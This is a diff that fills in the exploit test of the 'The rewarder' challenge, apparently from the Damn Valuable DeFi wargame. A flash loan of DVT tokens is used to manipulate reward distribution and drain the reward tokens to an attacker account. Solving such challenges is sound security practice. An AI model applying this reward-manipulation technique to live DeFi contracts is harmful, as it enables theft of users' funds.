@@ -13,10 +13,10 @@ describe('[Challenge] The rewarder', function () {
 
         [deployer, alice, bob, charlie, david, attacker] = await ethers.getSigners();
         users = [alice, bob, charlie, david];
-
+        
+        const DamnValuableTokenFactory = await ethers.getContractFactory('DamnValuableToken', deployer);
         const FlashLoanerPoolFactory = await ethers.getContractFactory('FlashLoanerPool', deployer);
         const TheRewarderPoolFactory = await ethers.getContractFactory('TheRewarderPool', deployer);
-        const DamnValuableTokenFactory = await ethers.getContractFactory('DamnValuableToken', deployer);
         const RewardTokenFactory = await ethers.getContractFactory('RewardToken', deployer);
         const AccountingTokenFactory = await ethers.getContractFactory('AccountingToken', deployer);
 
@@ -65,7 +65,24 @@ describe('[Challenge] The rewarder', function () {
     });
 
     it('Exploit', async function () {
-        /** CODE YOUR EXPLOIT HERE */
+        //This exploit combines two lenderPools and three ERC20 tokens. We are coding a malicious contract to take 
+        //a flashloan on DVT tokens on one pool and perform operations with this amount in the other pool before 
+        //returning the flashloan.
+        //The math behind the rewards in distributeRewards() function gets tricked by our amount deposited so we 
+        //outcome with most of the tokens. 
+        //Once our attacker contract gets the tokens, we transfer them to our attacker address. 
+        //Important: Simulate 5 days to pass in order to get rewards 
+
+        const attackerContractFactory = await ethers.getContractFactory('RewarderAttacker');
+        const attackerContract = await attackerContractFactory.deploy(this.flashLoanPool.address, this.liquidityToken.address, this.rewarderPool.address, attacker.address);
+        
+        await ethers.provider.send("evm_increaseTime", [5 * 24 * 60 * 60]); // 5 days
+        
+        await attackerContract.connect(attacker).callFlashLoan(ethers.utils.parseEther('1000000'));
+        console.log("Attacker contract obtained reward tokens!", (await this.rewardToken.balanceOf(attackerContract.address)).toString())
+        await attackerContract.connect(attacker).withdraw(this.rewardToken.address);
+        console.log("Attacker gained all tokens!", (await this.rewardToken.balanceOf(attacker.address)).toString())
+
     });
 
     after(async function () {
